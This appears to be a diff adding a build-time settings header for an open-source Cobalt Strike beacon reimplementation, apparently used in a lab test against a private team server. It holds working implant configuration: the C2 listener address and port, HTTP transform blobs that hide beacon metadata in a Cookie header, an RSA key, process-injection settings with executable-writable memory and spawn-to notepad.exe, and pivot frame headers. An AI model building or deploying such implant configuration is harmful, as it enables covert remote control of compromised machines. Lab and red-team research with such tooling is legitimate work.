@@ -1,0 +1,127 @@
+/* settings.h — B-1 glue for CobaltStrike_OpenBeacon against our FrankenTS.
+ * Build-time configuration (the upstream repo withholds this file; every
+ * S_* is a compile-time constant consumed by protocol.c/strategy.c/
+ * spawn.c/self.c/network.c/metadata.c).
+ *
+ * Target listener: franken-http 192.168.100.200:8082, profile r2_inj_tpd
+ * (http-get client: base64 + header "Cookie"; server output: print;
+ * http-post client: id param + print output). */
+#pragma once
+
+/* ---- host / port ---- */
+#define S_DOMAINS      "192.168.100.200"
+#define S_PORT_HTTP    8082
+#define S_PROTOCOL     0            /* PROTOCOL_HTTP */
+#define S_DOMAIN_STRATEGY 0         /* STRATEGY_DEFAULT */
+#define S_MAX_RETRY_STRATEGY_ATTEMPTS 0
+#define S_MAX_RETRY_STRATEGY_INCREASE 0
+#define S_MAX_RETRY_STRATEGY_DURATION 0
+
+/* ---- lifecycle ---- */
+#define S_KILLDATE     0
+#define S_CFG_CAUTION  0
+#define S_EXIT_FUNK    0            /* 0 = process exit (BeaconInterrupt) */
+
+/* ---- proxy ---- */
+#define S_PROXY_BEHAVIOR 1          /* PROXY_DIRECT */
+#define S_PROXY_CONFIG   ""
+#define S_PROXY_USER     ""
+#define S_PROXY_PASSWORD ""
+
+/* ---- spawnto ---- */
+#define S_SPAWNTO_X86  "%windir%\\syswow64\\notepad.exe"
+#define S_SPAWNTO_X64  "%windir%\\sysnative\\notepad.exe"
+
+/* ---- process-inject ---- */
+#define S_PROCINJ_MINALLOC      10000
+#define S_PROCINJ_PERMS         0x40   /* PAGE_EXECUTE_READWRITE */
+#define S_PROCINJ_PERMS_I       0x40
+#define S_PROCINJ_ALLOCATOR     0      /* VirtualAllocEx */
+#define S_PROCINJ_EXECUTE       ob_execute_blob       /* datap-style blob */
+#define S_PROCINJ_TRANSFORM_X86 ob_transform_empty
+#define S_PROCINJ_TRANSFORM_X64 ob_transform_empty
+
+/* ---- RSA public key: 162-byte DER SubjectPublicKeyInfo from our TS
+ * (.cobaltstrike.beacon_keys -> AsymmetricCrypto.exportPublicKey).
+ * metadata.c: rsa_import(pubkey, 162, &key) — exactly this blob. */
+#define S_PUBKEY ((unsigned char*)ob_pubkey_162)
+
+/* ---- HTTP transforms (step ints are BIG-ENDIAN via BeaconDataInt;
+ * strings are BeaconDataStringCopySafe = [BE len][bytes]) ----
+ * STEP_BUILD 0x7 (arg 0x0=session, 0x1=output), STEP_PREPEND 0x2,
+ * STEP_BASE64 0x3, STEP_PRINT 0x4, STEP_PARAMETER 0x5, STEP_HEADER 0x6,
+ * STEP_APPEND 0x1, terminator 0x0. */
+#define S_C2_REQUEST   ((char*)ob_c2_request)    /* GET: b64 metadata -> Cookie */
+#define S_C2_RECOVER   ((char*)ob_c2_recover)    /* server output print = identity */
+#define S_C2_POSTREQ   ((char*)ob_c2_postreq)    /* POST: id param + print body */
+#define S_C2_VERB_POST "POST"
+
+/* ---- headers ---- */
+#define S_HOST_HEADER    ""
+#define S_HEADERS_REMOVE ""
+
+/* ---- link frame headers (pivots unused in this test; minimal valid
+ * blob: [BE16 headerLength=16][steps producing 16 NUL-free bytes]) ---- */
+#define S_TCP_FRAME_HEADER ((char*)ob_tcp_frame_header)
+#define S_SMB_FRAME_HEADER ((char*)ob_smb_frame_header)
+
+/* ---- data ---- */
+static const unsigned char ob_pubkey_162[162] = {
+    0x30,0x81,0x9f,0x30,0x0d,0x06,0x09,0x2a,0x86,0x48,0x86,0xf7,0x0d,0x01,0x01,0x01,
+    0x05,0x00,0x03,0x81,0x8d,0x00,0x30,0x81,0x89,0x02,0x81,0x81,0x00,0x92,0xc2,0xca,
+    0xf3,0x2c,0x85,0xac,0x15,0x6d,0x07,0xa8,0x5a,0xa9,0x03,0xec,0xf6,0xf7,0x11,0xa7,
+    0xe8,0x77,0xb7,0x79,0x98,0xa8,0x13,0x9b,0xac,0x53,0xde,0x49,0x72,0x90,0x9b,0x39,
+    0x11,0x28,0x7f,0xb9,0xaa,0x0c,0xf5,0x94,0xb0,0x4e,0x3e,0xc3,0x50,0xc4,0x8e,0xbe,
+    0xc1,0xf0,0x4c,0x0e,0x0e,0xd6,0xf4,0xf8,0xdc,0xbe,0xfb,0xc0,0x35,0x25,0x6a,0x36,
+    0x8e,0x35,0x1a,0x94,0x0a,0x53,0x40,0xe6,0xf9,0xe4,0x26,0xcf,0xfd,0xfb,0xe4,0x89,
+    0x6b,0xc8,0x29,0xb5,0x34,0x3b,0xc9,0x95,0x8d,0x05,0x9f,0x13,0x37,0x66,0x5f,0xa8,
+    0x11,0x45,0x10,0xbd,0x3a,0xc9,0x20,0xd0,0x98,0x53,0x70,0x32,0x77,0x20,0x0d,0x8e,
+    0xdb,0x4e,0x5a,0x6c,0x3f,0x3f,0x6f,0xf2,0x13,0x7d,0x2b,0xaf,0x30,0x20,0x30,0x10,
+    0x00,0x01
+};
+
+/* helpers: BE dword for the transform blobs */
+#define OB_BE(v) ((char)(((unsigned int)(v) >> 24) & 0xff)), \
+                 ((char)(((unsigned int)(v) >> 16) & 0xff)), \
+                 ((char)(((unsigned int)(v) >> 8) & 0xff)), \
+                 ((char)((unsigned int)(v) & 0xff))
+#define OB_STR(s) OB_BE(sizeof(s) - 1), s
+
+/* GET request: BUILD(session) -> BASE64 -> HEADER "Cookie" -> end */
+static const char ob_c2_request[] = {
+    OB_BE(7), OB_BE(0), OB_BE(3),
+    OB_BE(6), OB_STR("Cookie"),
+    OB_BE(0)
+};
+
+/* server output "print": empty step list = identity decode */
+static const char ob_c2_recover[] = { OB_BE(0) };
+
+/* POST request: BUILD(session=bid) -> PARAMETER "id" ->
+ * BUILD(output) -> PRINT -> end */
+static const char ob_c2_postreq[] = {
+    OB_BE(7), OB_BE(0),
+    OB_BE(5), OB_STR("id"),
+    OB_BE(7), OB_BE(1),
+    OB_BE(4),
+    OB_BE(0)
+};
+
+/* process-inject execute techniques blob (spawn.c BeaconDataParse(...,128)) */
+static const char ob_execute_blob[8] = { OB_BE(0), 0, 0, 0 };
+/* empty transform blobs */
+static const char ob_transform_empty[] = { OB_BE(0) };
+
+/* link frame headers: [BE16 len=16][BUILD(output)][APPEND 16x 'A'][end] */
+static const char ob_tcp_frame_header[] = {
+    0x00, 0x10,
+    OB_BE(7), OB_BE(1),
+    OB_BE(1), OB_BE(16), 'A','A','A','A','A','A','A','A','A','A','A','A','A','A','A','A',
+    OB_BE(0)
+};
+static const char ob_smb_frame_header[] = {
+    0x00, 0x10,
+    OB_BE(7), OB_BE(1),
+    OB_BE(1), OB_BE(16), 'B','B','B','B','B','B','B','B','B','B','B','B','B','B','B','B',
+    OB_BE(0)
+};
